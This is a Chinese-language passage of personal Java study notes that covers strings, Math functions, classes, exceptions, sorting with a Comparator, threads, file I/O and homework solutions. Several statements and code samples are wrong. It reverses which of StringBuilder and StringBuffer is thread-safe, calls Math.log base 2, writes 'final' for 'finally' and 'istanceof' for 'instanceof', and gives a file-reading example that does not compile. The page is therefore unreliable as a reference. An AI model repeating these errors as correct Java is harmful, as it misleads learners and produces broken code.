<h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="string">"abc"</span>;</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"aaa"</span>));</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"abc"</span>));</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"bbb"</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="StringBuilder-Stringbuffer"><a href="#StringBuilder-Stringbuffer" class="headerlink" title="StringBuilder/Stringbuffer"></a>StringBuilder/Stringbuffer</h3><p>这两个类型都是用来处理字符串操作的, 区别主要在于前者线程安全. 所以使用方法大同小异.<br><code>StringBuffer sb = new StringBuffer(&quot;abc dds&quot;);</code></p>
<h4 id="删除某位字符"><a href="#删除某位字符" class="headerlink" title="删除某位字符"></a>删除某位字符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.deleteCharAt(<span class="number">1</span>); <span class="comment">//=&gt; "ac dds"</span></span><br></pre></td></tr></table></figure>

<h4 id="加入字符串"><a href="#加入字符串" class="headerlink" title="加入字符串"></a>加入字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.insert(<span class="number">1</span>,<span class="string">"bs"</span>); <span class="comment">//=&gt; "absbc dds"</span></span><br></pre></td></tr></table></figure>

<h2 id="数学函数-以下省略-Math"><a href="#数学函数-以下省略-Math" class="headerlink" title="数学函数 (以下省略 Math. )"></a>数学函数 (以下省略 <code>Math.</code> )</h2><h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sin(<span class="keyword">double</span> a);</span><br><span class="line">cos(<span class="keyword">double</span> a);</span><br><span class="line">tan(<span class="keyword">double</span> a);</span><br><span class="line">acos(<span class="keyword">double</span> a);  <span class="comment">//arccos </span></span><br><span class="line">asin(<span class="keyword">double</span> a);  <span class="comment">//arcsin</span></span><br><span class="line">atan(<span class="keyword">double</span> a);  <span class="comment">//arctan</span></span><br></pre></td></tr></table></figure>

<h3 id="幂运算-对数运算"><a href="#幂运算-对数运算" class="headerlink" title="幂运算, 对数运算"></a>幂运算, 对数运算</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp(<span class="keyword">double</span> a); <span class="comment">//e 的 a 次方</span></span><br><span class="line">log(<span class="keyword">double</span> a); <span class="comment">//以 2 为底</span></span><br><span class="line">log10(<span class="keyword">double</span> a);</span><br><span class="line">pow(<span class="keyword">double</span> a, <span class="keyword">double</span> b); <span class="comment">// a 的 b 次方</span></span><br><span class="line">sqrt(<span class="keyword">double</span> a);</span><br></pre></td></tr></table></figure>

<h3 id="取整"><a href="#取整" class="headerlink" title="取整"></a>取整</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ceil</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  <span class="comment">//向上取整</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">floor</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  <span class="comment">//向下取整</span></span><br><span class="line"><span class="comment">//返回最接近参数的整数值, 若存在两个这样的数, 则返回其中的偶数</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">rint</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">round</span><span class="params">(<span class="keyword">float</span> x)</span></span>;  <span class="comment">//四舍五入</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">round</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random() <span class="comment">// 随机数  0 &lt;= x &lt; 1.0</span></span><br><span class="line">abs(a)  </span><br><span class="line">max(a,b)</span><br><span class="line">min(a,b)</span><br></pre></td></tr></table></figure>

<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="类的声明公式"><a href="#类的声明公式" class="headerlink" title="类的声明公式"></a>类的声明公式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[可见度] class ClassName [extends 一个类的名字] [implements 若干个 interface 的名字] &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对象默认父类-–-Object"><a href="#对象默认父类-–-Object" class="headerlink" title="对象默认父类 – Object"></a>对象默认父类 – Object</h3><ul>
<li>clone() 拷贝</li>
<li>equals(Object obj) 判断对象是否相等</li>
<li>finalize() 相当于析构函数</li>
<li>getClass() 获取类的相关信息</li>
<li>hashCode() 获取对象的哈希值</li>
<li>toString() 类转为字符串</li>
</ul>
<h3 id="a-istanceof-B"><a href="#a-istanceof-B" class="headerlink" title="a istanceof B"></a>a istanceof B</h3><p>返回一个boolean : a(实例) 是否是 B(class) 的实例.<br>如果 B 是 A 的父类, <code>a istanceof B</code> 仍然为 true.<br>但如果 A 是 B 的父类, 该表达式为假.</p>
<h3 id="override"><a href="#override" class="headerlink" title="@override"></a>@override</h3><p>在子类的函数名前使用<code>@override</code>, 编译器会自动检查父类中有没有同名的方法供子类override. 若没有, 则直接报错.</p>
<blockquote>
<p>重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写!</p>
</blockquote>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><ol>
<li>类似C++的构造函数(不再赘述)</li>
<li><code>this()</code>构造函数, 只能在构造函数中调用其它构造函数时使用.(且必须写在第一行)<br> 与通常的构造函数不同, this()不会产生新的对象, 而是对自身属性进行修改.</li>
<li><code>super()</code>: 与<code>this()</code>类似, 显式调用父类的构造函数.<br> 不然会默认调用父类的无参构造函数.inal </li>
<li>只要类中显示定义了一个构造函数, 则不会产生默认无参构造函数.</li>
</ol>
<h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><ul>
<li><code>static{}</code> 代码块仅在类被加载时执行一次</li>
<li>static 静态方法会失去多态特性.</li>
</ul>
<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><ul>
<li>final 类</li>
<li>final 方法 </li>
<li>final 变量</li>
</ul>
<h3 id="接口的声明"><a href="#接口的声明" class="headerlink" title="接口的声明"></a>接口的声明</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface A [extends ...其它接口名...]&#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li><p>关键字 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> e</span><br><span class="line">    <span class="comment">/* 亦可能在方法中抛出 */</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">/* 异常处理 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">final</span>&#123;<span class="comment">/*无论是否有异常都会执行*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一个函数若可能抛出异常: </p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">()</span> <span class="keyword">throws</span> exceptions</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>  则调用该方法的地方都要try, catch.<br>  <strong>除了RuntimeException</strong></p>
</li>
<li><p>异常实例的方法 <code>e.getMessage()</code> 可以获得异常信息. </p>
</li>
</ul>
<h2 id="Arrays-比较器"><a href="#Arrays-比较器" class="headerlink" title="Arrays 比较器"></a>Arrays 比较器</h2><p><code>java.util.Arrays</code>中的sort函数可以对数组自动排序, 默认排序顺序为由小到大. 例如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>];</span><br><span class="line">Arrays.sort(arr);</span><br></pre></td></tr></table></figure>

<p>但是如果要使用其它的排序策略或者要排序无法直接比较大小的对象需要自定义一个类, 这个类需要继承<code>Comparator&lt;&gt;</code>接口, 并在其中构造<code>compare</code>函数.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student类的定义(简略)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	<span class="keyword">double</span> score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// cmp函数及其所在的类的定义</span></span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmp</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">Student</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Student a,Student b)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 排序顺序和这里返回的int值有关</span></span><br><span class="line">		<span class="comment">// 如果 &gt; 分支里返回 &gt;0 的值, &lt; 分支里返回 &lt;0 的值 </span></span><br><span class="line">		<span class="comment">// 那么按照升序排列</span></span><br><span class="line">		<span class="comment">// 如果 &lt; 分支里返回 &gt;0 的值, &gt; 分支里返回 &lt;0 的值 </span></span><br><span class="line">		<span class="comment">// 那么按照降序排列</span></span><br><span class="line">		<span class="keyword">if</span>(Math.abs(a.score - b.score) &lt; <span class="number">0.00001</span>)	</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(a.score &gt; b.score)	</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用sort</span></span><br><span class="line">Student[] arr = <span class="keyword">new</span> Student[<span class="number">5</span>];</span><br><span class="line">Arrays.sort(arr, <span class="keyword">new</span> cmp());</span><br></pre></td></tr></table></figure>

<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="线程的创建和使用"><a href="#线程的创建和使用" class="headerlink" title="线程的创建和使用"></a>线程的创建和使用</h3><p>定义一个Thread类的子类. 覆盖Thread的run()方法. 然后创建该子类的实例.</p>
<p><strong>线程的启动需要使用start(), 而不是run()</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">	MyThread t1 = <span class="keyword">new</span> MyThread();</span><br><span class="line">	MyThread t2 = <span class="keyword">new</span> MyThread();</span><br><span class="line">	t2.start(); t1.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h3><p>让其它线程有机会执行, 可以使用以下方法</p>
<ul>
<li>Thread.sleep()<br>线程睡眠</li>
<li>Thread.yield()<br>线程让步, 在线程的run()中调用.</li>
<li>Thread.join()<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Machine machine = <span class="keyword">new</span> Machine();</span><br><span class="line">machine.start();</span><br><span class="line">Sytem.out.print...</span><br><span class="line">machine.join();</span><br><span class="line"><span class="comment">// 主线程会等待machine线程运行结束再向下运行.</span></span><br><span class="line">Sytem.out.print...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h2><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">readFromTxt</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	Stringbuff buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">	<span class="keyword">char</span>[] chars = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">	Reader reader = <span class="keyword">new</span> FileReader(filename);</span><br><span class="line">	<span class="keyword">int</span> readed = reader.read(chars);</span><br><span class="line">	<span class="keyword">while</span>(readed != -<span class="number">1</span>)&#123;</span><br><span class="line">		buf.append(chars, <span class="number">0</span>, reader);</span><br><span class="line">		readed = reader.read(chars);</span><br><span class="line">	&#125;</span><br><span class="line">	reader.close();</span><br><span class="line">	<span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="作业代码"><a href="#作业代码" class="headerlink" title="作业代码"></a>作业代码</h2><h3 id="Home01"><a href="#Home01" class="headerlink" title="Home01"></a>Home01</h3><ul>
<li>Home01.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h01;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home01</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断a,b,c是否能够构成三角形的三个边</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isTriangle</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(a+b &lt;= c) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(b+c &lt;= a)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(a+c &lt;= b)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 判断两个浮点数是否相等，一般认为如果两个浮点数的差值小于0.0001，即认为相等</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEq</span><span class="params">(<span class="keyword">float</span> f1, <span class="keyword">float</span> f2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Math.abs(f1-f2) &lt; <span class="number">0.0001</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 将学生百分之成绩变换为A(&gt;=90,B&gt;=80且非A,C&gt;=70且非C,D&gt;=60且非D,E 其他)</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getGrade</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"A"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"B"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"C"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"D"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &lt; <span class="number">60</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"E"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断一个数字是否是质数，如果是质数返回true，否则false</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">		<span class="keyword">int</span> finish =  (<span class="keyword">int</span>)(Math.sqrt(i)) + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> a = <span class="number">2</span>;a &lt;= finish;a++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(i % a == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 计算 整数 i+(i+1)....+j的加和</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(;i &lt;= j;i++) &#123;</span><br><span class="line">			sum += i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 返回大于等于i，且小于等于j的所有的偶数的加和</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getEvenSum</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(;i &lt;= j;i+=<span class="number">2</span>) &#123;</span><br><span class="line">			sum += i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 返回i,j,k中的最大值</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = (i &lt; j)? j:i;</span><br><span class="line">		result = (result&lt;k)? k:result;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断一个数是否是水仙花数，</span></span><br><span class="line">	<span class="comment">// 所谓 "水仙花数 "是指一个三位数，其各位数字立方和等于该数本身。例如：153是一个 "水仙花数 "，因为153=1的三次方＋5的三次方＋3的三次方。</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNarcissisticNum</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(i &lt; <span class="number">100</span> || i &gt; <span class="number">999</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">int</span> a,b,c,d = i;</span><br><span class="line">			a = d % <span class="number">10</span>;</span><br><span class="line">			d /= <span class="number">10</span>;</span><br><span class="line">			b = d % <span class="number">10</span>;</span><br><span class="line">			d /= <span class="number">10</span>;</span><br><span class="line">			c = d;</span><br><span class="line">			<span class="keyword">if</span>( Math.pow(a,<span class="number">3</span>)+ Math.pow(b, <span class="number">3</span>)+Math.pow(c, <span class="number">3</span>) == i ) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="comment">// 判断一个数是否是完全数，</span></span><br><span class="line">	 <span class="comment">// 一个数如果恰好等于它的因子之和，这个数就称为 "完全数 "。</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Perfectnumber</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> a = <span class="number">2</span>;a &lt; i;a++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(i % a == <span class="number">0</span>) &#123;</span><br><span class="line">				sum += a;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(sum + <span class="number">1</span> == i) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home02"><a href="#Home02" class="headerlink" title="Home02"></a>Home02</h3><ul>
<li>Home02.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 